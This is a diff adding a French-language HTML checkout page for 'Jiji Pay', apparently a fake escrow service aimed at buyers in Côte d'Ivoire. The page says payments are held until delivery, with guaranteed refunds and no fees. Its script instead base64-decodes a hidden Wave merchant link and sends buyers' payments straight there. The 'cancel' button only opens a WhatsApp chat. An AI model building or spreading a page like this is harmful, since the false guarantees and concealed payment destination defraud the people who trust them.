@@ -1,0 +1,638 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Jiji Pay — Commande Sécurisée</title>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --g1:#00B14F;
+  --g2:#00C957;
+  --g3:#007A35;
+  --gl:#E8F9EE;
+  --gm:#C3EFCE;
+  --bg:#F0F4F0;
+  --white:#FFFFFF;
+  --dark:#111827;
+  --dark2:#374151;
+  --gray:#6B7280;
+  --lightgray:#D1D5DB;
+  --border:#E5E7EB;
+  --red:#EF4444;
+  --redl:#FEE2E2;
+  --shadow:0 1px 6px rgba(0,0,0,.07);
+  --shadow2:0 6px 24px rgba(0,177,79,.18);
+}
+html,body{font-family:'Poppins',sans-serif;background:var(--bg);color:var(--dark);min-height:100vh}
+
+/* ══════════════ SPLASH ══════════════ */
+#splash{
+  position:fixed;inset:0;z-index:300;
+  display:flex;flex-direction:column;align-items:center;justify-content:center;
+  padding:28px 24px;
+  overflow:hidden;
+  transition:opacity .5s,transform .5s;
+}
+#splash.hide{opacity:0;transform:scale(1.04);pointer-events:none}
+
+/* Fond animé */
+.sp-bg{
+  position:absolute;inset:0;
+  background:linear-gradient(160deg,#005C28 0%,#00873C 45%,#00B14F 100%);
+  z-index:0;
+}
+.sp-circle{
+  position:absolute;border-radius:50%;
+  background:rgba(255,255,255,.06);
+  animation:breathe 4s ease-in-out infinite;
+}
+.sc1{width:340px;height:340px;top:-80px;right:-80px;animation-delay:0s}
+.sc2{width:260px;height:260px;bottom:-60px;left:-60px;animation-delay:1.5s}
+.sc3{width:160px;height:160px;top:40%;left:-40px;animation-delay:.8s}
+
+.sp-content{position:relative;z-index:2;width:100%;max-width:380px;text-align:center}
+
+.sp-chip{
+  display:inline-flex;align-items:center;gap:7px;
+  background:rgba(255,255,255,.15);
+  border:1px solid rgba(255,255,255,.25);
+  border-radius:99px;
+  padding:7px 16px;
+  font-size:11px;font-weight:600;color:#fff;
+  letter-spacing:.8px;text-transform:uppercase;
+  margin-bottom:24px;
+  animation:fadeUp .6s .1s both;
+}
+.sp-chip-dot{width:7px;height:7px;border-radius:50%;background:var(--g2);animation:pulse 1.5s infinite}
+
+.sp-logo{
+  font-size:clamp(52px,14vw,80px);
+  font-weight:900;color:#fff;
+  letter-spacing:-3px;line-height:1;
+  animation:fadeUp .7s .25s both;
+}
+.sp-logo .pay{
+  color:rgba(255,255,255,.45);
+  font-size:clamp(22px,6vw,34px);
+  font-weight:700;letter-spacing:-1px;
+  display:block;margin-top:-4px;
+}
+
+.sp-tagline{
+  font-size:15px;font-weight:500;
+  color:rgba(255,255,255,.85);
+  line-height:1.6;margin-top:16px;
+  animation:fadeUp .7s .4s both;
+}
+
+/* 3 pills feature */
+.sp-pills{
+  display:flex;flex-direction:column;gap:10px;
+  margin:28px 0;
+}
+.sp-pill{
+  background:rgba(255,255,255,.12);
+  border:1px solid rgba(255,255,255,.2);
+  border-radius:14px;
+  padding:14px 16px;
+  display:flex;align-items:center;gap:12px;
+  text-align:left;
+  animation:fadeUp .6s both;
+}
+.sp-pill:nth-child(1){animation-delay:.5s}
+.sp-pill:nth-child(2){animation-delay:.65s}
+.sp-pill:nth-child(3){animation-delay:.8s}
+.pill-icon{font-size:24px;flex-shrink:0}
+.pill-title{font-size:13px;font-weight:700;color:#fff;margin-bottom:1px}
+.pill-desc{font-size:11px;color:rgba(255,255,255,.7);line-height:1.3}
+
+.sp-enter{
+  width:100%;
+  padding:17px;
+  background:#fff;
+  color:var(--g1);
+  font-family:'Poppins',sans-serif;
+  font-size:15px;font-weight:800;
+  border:none;border-radius:16px;cursor:pointer;
+  transition:transform .15s,box-shadow .2s;
+  box-shadow:0 8px 24px rgba(0,0,0,.2);
+  animation:fadeUp .6s .95s both;
+  letter-spacing:.3px;
+}
+.sp-enter:hover{transform:translateY(-2px);box-shadow:0 12px 32px rgba(0,0,0,.25)}
+.sp-enter:active{transform:translateY(0)}
+
+.sp-sub{
+  font-size:11px;color:rgba(255,255,255,.5);
+  margin-top:12px;
+  animation:fadeUp .5s 1.1s both;
+}
+
+/* ══════════════ APP ══════════════ */
+#app{min-height:100vh;display:none;flex-direction:column;opacity:0;transition:opacity .5s}
+#app.show{display:flex}
+#app.visible{opacity:1}
+
+/* Header */
+.header{
+  background:var(--g1);
+  padding:0 16px;
+  position:sticky;top:0;z-index:50;
+}
+.header-inner{
+  display:flex;align-items:center;justify-content:space-between;
+  height:58px;
+}
+.h-logo{font-size:22px;font-weight:900;color:#fff;letter-spacing:-1px}
+.h-logo span{color:rgba(255,255,255,.45);font-size:14px;font-weight:600;letter-spacing:0}
+.h-secure{
+  display:flex;align-items:center;gap:6px;
+  background:rgba(255,255,255,.15);
+  border-radius:99px;padding:5px 12px;
+  font-size:11px;font-weight:700;color:#fff;
+}
+.h-dot{width:6px;height:6px;border-radius:50%;background:#fff;animation:pulse 1.5s infinite}
+
+/* Hero card */
+.hero-card{
+  margin:14px 14px 0;
+  background:linear-gradient(135deg,var(--g1),var(--g2));
+  border-radius:20px;
+  padding:22px 20px;
+  position:relative;overflow:hidden;
+  box-shadow:var(--shadow2);
+}
+.hero-card::before{
+  content:'';
+  position:absolute;top:-30px;right:-30px;
+  width:120px;height:120px;border-radius:50%;
+  background:rgba(255,255,255,.1);
+}
+.hero-card::after{
+  content:'';
+  position:absolute;bottom:-20px;right:20px;
+  width:80px;height:80px;border-radius:50%;
+  background:rgba(255,255,255,.07);
+}
+.hc-label{
+  font-size:10px;font-weight:700;
+  color:rgba(255,255,255,.7);
+  letter-spacing:1.5px;text-transform:uppercase;
+  margin-bottom:6px;
+}
+.hc-title{
+  font-size:22px;font-weight:900;color:#fff;
+  line-height:1.2;letter-spacing:-.5px;
+  position:relative;z-index:2;
+}
+.hc-sub{
+  font-size:12px;color:rgba(255,255,255,.8);
+  margin-top:8px;line-height:1.5;
+  position:relative;z-index:2;
+}
+.hc-badges{
+  display:flex;gap:8px;margin-top:14px;flex-wrap:wrap;
+  position:relative;z-index:2;
+}
+.hc-badge{
+  background:rgba(255,255,255,.2);
+  border-radius:99px;padding:4px 11px;
+  font-size:11px;font-weight:600;color:#fff;
+}
+
+/* Stats */
+.stats{
+  display:grid;grid-template-columns:repeat(3,1fr);
+  gap:10px;margin:12px 14px 0;
+}
+.stat{
+  background:var(--white);
+  border-radius:14px;border:1px solid var(--border);
+  padding:14px 10px;text-align:center;
+  box-shadow:var(--shadow);
+}
+.stat-v{font-size:20px;font-weight:900;color:var(--g1)}
+.stat-l{font-size:10px;color:var(--gray);margin-top:2px;font-weight:500}
+
+/* Étapes */
+.section{padding:18px 14px 0}
+.section-title{
+  font-size:13px;font-weight:800;
+  color:var(--dark2);
+  text-transform:uppercase;letter-spacing:1px;
+  display:flex;align-items:center;gap:8px;
+  margin-bottom:12px;
+}
+.section-title::before{
+  content:'';width:4px;height:16px;
+  background:var(--g1);border-radius:99px;flex-shrink:0;
+}
+
+.steps{display:flex;gap:8px}
+.step{
+  flex:1;
+  background:var(--white);
+  border-radius:14px;
+  border:1px solid var(--border);
+  padding:14px 10px;
+  text-align:center;
+  box-shadow:var(--shadow);
+}
+.step-n{
+  width:28px;height:28px;border-radius:50%;
+  font-size:12px;font-weight:800;
+  display:flex;align-items:center;justify-content:center;
+  margin:0 auto 8px;
+  background:var(--gl);color:var(--g1);
+}
+.step-e{font-size:18px;margin-bottom:4px}
+.step-t{font-size:11px;font-weight:700;color:var(--dark)}
+.step-d{font-size:10px;color:var(--gray);margin-top:2px;line-height:1.3}
+
+/* Formulaire */
+.form-card{
+  margin:14px 14px 0;
+  background:var(--white);
+  border-radius:20px;
+  border:1px solid var(--border);
+  box-shadow:var(--shadow);
+  overflow:hidden;
+}
+.fc-head{
+  padding:16px 18px 14px;
+  border-bottom:1px solid var(--border);
+  display:flex;align-items:center;gap:10px;
+}
+.fc-head-icon{
+  width:36px;height:36px;border-radius:10px;
+  background:var(--gl);
+  display:flex;align-items:center;justify-content:center;
+  font-size:16px;
+}
+.fc-head-title{font-size:15px;font-weight:800}
+.fc-head-sub{font-size:11px;color:var(--gray)}
+
+.f-field{
+  display:flex;align-items:center;gap:12px;
+  padding:14px 18px;
+  border-bottom:1px solid var(--border);
+  transition:background .15s;
+}
+.f-field:last-child{border-bottom:none}
+.f-field:focus-within{background:#FAFFFE}
+.f-ico{
+  width:40px;height:40px;border-radius:12px;
+  display:flex;align-items:center;justify-content:center;
+  font-size:18px;flex-shrink:0;
+}
+.ico-g{background:var(--gl)}
+.ico-b{background:#EFF6FF}
+.ico-y{background:#FFFBEB}
+.f-lbl{
+  display:block;font-size:10px;font-weight:700;
+  color:var(--gray);letter-spacing:.8px;
+  text-transform:uppercase;margin-bottom:3px;
+}
+.f-input{
+  width:100%;border:none;outline:none;
+  font-family:'Poppins',sans-serif;
+  font-size:15px;font-weight:700;color:var(--dark);
+  background:transparent;
+}
+.f-input::placeholder{color:#D1D5DB;font-weight:400}
+.f-price-row{display:flex;align-items:center;gap:8px}
+.f-price-row .f-input{flex:1}
+.fcfa{
+  background:var(--gl);color:var(--g1);
+  font-size:11px;font-weight:800;
+  padding:4px 9px;border-radius:8px;flex-shrink:0;
+}
+
+/* Bouton commander */
+.cmd-section{padding:14px 14px 0}
+.cmd-btn{
+  width:100%;padding:17px;
+  background:var(--g1);color:#fff;
+  font-family:'Poppins',sans-serif;
+  font-size:15px;font-weight:800;
+  border:none;border-radius:16px;cursor:pointer;
+  transition:background .2s,transform .15s,box-shadow .2s;
+  box-shadow:var(--shadow2);
+  display:flex;align-items:center;justify-content:center;gap:8px;
+  letter-spacing:.2px;
+}
+.cmd-btn:hover{background:var(--g2);transform:translateY(-2px);box-shadow:0 10px 28px rgba(0,177,79,.3)}
+.cmd-btn:active{transform:translateY(0)}
+
+/* Bouton annuler */
+.cancel-btn{
+  width:100%;padding:15px;
+  background:var(--white);
+  color:var(--red);
+  font-family:'Poppins',sans-serif;
+  font-size:14px;font-weight:700;
+  border:1.5px solid #FECACA;
+  border-radius:16px;cursor:pointer;
+  transition:background .2s,transform .15s;
+  display:flex;align-items:center;justify-content:center;gap:8px;
+  margin-top:10px;
+}
+.cancel-btn:hover{background:var(--redl);transform:translateY(-1px)}
+.cancel-btn:active{transform:translateY(0)}
+.cancel-note{
+  font-size:10px;color:var(--gray);
+  text-align:center;margin-top:7px;
+  line-height:1.4;
+}
+
+/* Erreur */
+.err{
+  display:none;
+  background:var(--redl);
+  border:1px solid #FECACA;
+  border-radius:12px;
+  padding:11px 14px;
+  margin:10px 0 0;
+  font-size:12px;font-weight:600;color:var(--red);
+  text-align:center;
+}
+.err.show{display:block}
+
+/* Garantie */
+.g-card{
+  margin:14px 14px 0;
+  background:var(--white);
+  border-radius:16px;
+  border:2px solid var(--gm);
+  padding:16px;
+  display:flex;gap:12px;align-items:flex-start;
+  box-shadow:0 2px 12px rgba(0,177,79,.08);
+}
+.g-ico{font-size:26px;flex-shrink:0;margin-top:1px}
+.g-title{font-size:13px;font-weight:800;color:var(--g1);margin-bottom:4px}
+.g-desc{font-size:12px;color:var(--gray);line-height:1.5}
+.g-desc b{color:var(--dark)}
+
+/* Wave */
+.wave-row{
+  margin:12px 14px 0;
+  background:var(--white);
+  border-radius:14px;border:1px solid var(--border);
+  padding:13px 16px;
+  display:flex;align-items:center;gap:12px;
+  box-shadow:var(--shadow);
+}
+.w-logo{
+  width:40px;height:40px;border-radius:10px;
+  background:linear-gradient(135deg,#1A5CFF,#003DCC);
+  display:flex;align-items:center;justify-content:center;
+  font-size:17px;font-weight:900;color:#fff;flex-shrink:0;
+}
+.w-name{font-size:13px;font-weight:800}
+.w-sub{font-size:11px;color:var(--gray)}
+.w-ok{
+  margin-left:auto;
+  background:var(--gl);color:var(--g1);
+  font-size:11px;font-weight:800;
+  padding:4px 11px;border-radius:99px;
+  flex-shrink:0;
+}
+
+/* Footer */
+.footer{
+  padding:22px 16px 32px;
+  text-align:center;
+  margin-top:auto;
+}
+.foot-logo{font-size:16px;font-weight:900;color:var(--g1);margin-bottom:3px}
+.foot-logo b{color:var(--dark)}
+.foot-txt{font-size:11px;color:var(--lightgray)}
+
+/* Animations */
+@keyframes fadeUp{
+  from{opacity:0;transform:translateY(20px)}
+  to{opacity:1;transform:translateY(0)}
+}
+@keyframes breathe{
+  0%,100%{transform:scale(1)}
+  50%{transform:scale(1.08)}
+}
+@keyframes pulse{
+  0%,100%{opacity:1;transform:scale(1)}
+  50%{opacity:.3;transform:scale(.65)}
+}
+</style>
+</head>
+<body>
+
+<!-- ══ SPLASH ══ -->
+<div id="splash">
+  <div class="sp-bg">
+    <div class="sp-circle sc1"></div>
+    <div class="sp-circle sc2"></div>
+    <div class="sp-circle sc3"></div>
+  </div>
+
+  <div class="sp-content">
+    <div class="sp-chip">
+      <div class="sp-chip-dot"></div>
+      Plateforme sécurisée
+    </div>
+
+    <div class="sp-logo">
+      JIJI
+      <span class="pay">PAY</span>
+    </div>
+
+    <p class="sp-tagline">Commandez. Recevez.<br>Puis seulement on paie.</p>
+
+    <div class="sp-pills">
+      <div class="sp-pill">
+        <div class="pill-icon">🔐</div>
+        <div>
+          <div class="pill-title">Argent bloqué & sécurisé</div>
+          <div class="pill-desc">Votre paiement est gardé par Jiji Pay, pas par le vendeur</div>
+        </div>
+      </div>
+      <div class="sp-pill">
+        <div class="pill-icon">📦</div>
+        <div>
+          <div class="pill-title">Payé à la livraison</div>
+          <div class="pill-desc">Le vendeur reçoit l'argent après confirmation de réception</div>
+        </div>
+      </div>
+      <div class="sp-pill">
+        <div class="pill-icon">↩️</div>
+        <div>
+          <div class="pill-title">Remboursement possible</div>
+          <div class="pill-desc">Livreur absent ? Annulez et contactez notre équipe</div>
+        </div>
+      </div>
+    </div>
+
+    <button class="sp-enter" onclick="enterSite()">Passer une commande →</button>
+    <p class="sp-sub">Appuyez sur Entrée ou touchez le bouton</p>
+  </div>
+</div>
+
+<!-- ══ APP ══ -->
+<div id="app">
+
+  <!-- Header -->
+  <div class="header">
+    <div class="header-inner">
+      <div class="h-logo">JIJI <span>PAY</span></div>
+      <div class="h-secure"><div class="h-dot"></div> Sécurisé</div>
+    </div>
+  </div>
+
+  <!-- Hero -->
+  <div class="hero-card">
+    <div class="hc-label">Commande Sécurisée</div>
+    <div class="hc-title">Payez en toute<br>confiance ✓</div>
+    <div class="hc-sub">Votre argent est protégé jusqu'à réception de votre colis.</div>
+    <div class="hc-badges">
+      <div class="hc-badge">🛡️ Garanti</div>
+      <div class="hc-badge">⚡ Wave</div>
+      <div class="hc-badge">0 F de frais</div>
+    </div>
+  </div>
+
+  <!-- Stats -->
+  <div class="stats">
+    <div class="stat"><div class="stat-v">100%</div><div class="stat-l">Sécurisé</div></div>
+    <div class="stat"><div class="stat-v">0 F</div><div class="stat-l">Frais</div></div>
+    <div class="stat"><div class="stat-v">✓</div><div class="stat-l">Garanti</div></div>
+  </div>
+
+  <!-- Étapes -->
+  <div class="section">
+    <div class="section-title">Comment ça marche</div>
+    <div class="steps">
+      <div class="step">
+        <div class="step-n">1</div>
+        <div class="step-e">📝</div>
+        <div class="step-t">Commandez</div>
+        <div class="step-d">Remplissez le formulaire</div>
+      </div>
+      <div class="step">
+        <div class="step-n">2</div>
+        <div class="step-e">🔒</div>
+        <div class="step-t">Sécurisé</div>
+        <div class="step-d">Jiji Pay garde votre argent</div>
+      </div>
+      <div class="step">
+        <div class="step-n">3</div>
+        <div class="step-e">✅</div>
+        <div class="step-t">Confirmez</div>
+        <div class="step-d">Colis reçu → vendeur payé</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Formulaire -->
+  <div class="section">
+    <div class="section-title">Votre commande</div>
+  </div>
+
+  <div class="form-card">
+    <div class="fc-head">
+      <div class="fc-head-icon">🛒</div>
+      <div>
+        <div class="fc-head-title">Détails de la commande</div>
+        <div class="fc-head-sub">Renseignez les informations ci-dessous</div>
+      </div>
+    </div>
+    <div class="f-field">
+      <div class="f-ico ico-g">🏪</div>
+      <div style="flex:1">
+        <label class="f-lbl">Nom du vendeur</label>
+        <input class="f-input" type="text" id="vendeur" placeholder="Ex : Boutique Alpha CI">
+      </div>
+    </div>
+    <div class="f-field">
+      <div class="f-ico ico-b">📦</div>
+      <div style="flex:1">
+        <label class="f-lbl">Nom de l'article</label>
+        <input class="f-input" type="text" id="article" placeholder="Ex : Samsung Galaxy S24">
+      </div>
+    </div>
+    <div class="f-field">
+      <div class="f-ico ico-y">💵</div>
+      <div style="flex:1">
+        <label class="f-lbl">Prix de l'article</label>
+        <div class="f-price-row">
+          <input class="f-input" type="number" id="prix" placeholder="Ex : 45 000" min="1">
+          <div class="fcfa">FCFA</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Boutons -->
+  <div class="cmd-section">
+    <button class="cmd-btn" onclick="commander()">🔒 Passer la commande sécurisée</button>
+    <div class="err" id="erreur">⚠️ Veuillez remplir tous les champs.</div>
+    <button class="cancel-btn" onclick="annuler()">✕ &nbsp;Annuler la commande</button>
+    <p class="cancel-note">Au cas où le livreur n'est pas encore arrivé</p>
+  </div>
+
+  <!-- Garantie -->
+  <div class="g-card">
+    <div class="g-ico">🛡️</div>
+    <div>
+      <div class="g-title">Garantie Jiji Pay</div>
+      <div class="g-desc">Le vendeur <b>ne reçoit l'argent qu'après</b> que vous confirmez avoir bien reçu votre colis. Aucun risque pour vous.</div>
+    </div>
+  </div>
+
+  <!-- Wave -->
+  <div class="wave-row">
+    <div class="w-logo">W</div>
+    <div>
+      <div class="w-name">Paiement Wave</div>
+      <div class="w-sub">Rapide · Sécurisé · Instantané</div>
+    </div>
+    <div class="w-ok">✓ Actif</div>
+  </div>
+
+  <!-- Footer -->
+  <div class="footer">
+    <div class="foot-logo"><b>JIJI</b> PAY</div>
+    <div class="foot-txt">© 2024 Jiji Pay · Commande Sécurisée · Côte d'Ivoire</div>
+  </div>
+
+</div>
+
+<script>
+function enterSite(){
+  const sp=document.getElementById('splash');
+  const ap=document.getElementById('app');
+  sp.classList.add('hide');
+  setTimeout(()=>{
+    sp.style.display='none';
+    ap.classList.add('show');
+    setTimeout(()=>ap.classList.add('visible'),30);
+  },500);
+}
+document.addEventListener('keydown',e=>{
+  if(e.key==='Enter'&&!document.getElementById('splash').classList.contains('hide'))enterSite();
+});
+function commander(){
+  const v=document.getElementById('vendeur').value.trim();
+  const a=document.getElementById('article').value.trim();
+  const p=parseInt(document.getElementById('prix').value);
+  const err=document.getElementById('erreur');
+  if(!v||!a||!p||p<=0){err.classList.add('show');return;}
+  err.classList.remove('show');
+  const base=atob('aHR0cHM6Ly9wYXkud2F2ZS5jb20vbS9NX2NpX2VkY1lGc09NaWpyai9jL2NpLw==');
+  window.location.href=base+'?amount='+p;
+}
+function annuler(){
+  window.location.href='https://wa.me/2250556333313';
+}
+</script>
+</body>
+</html>
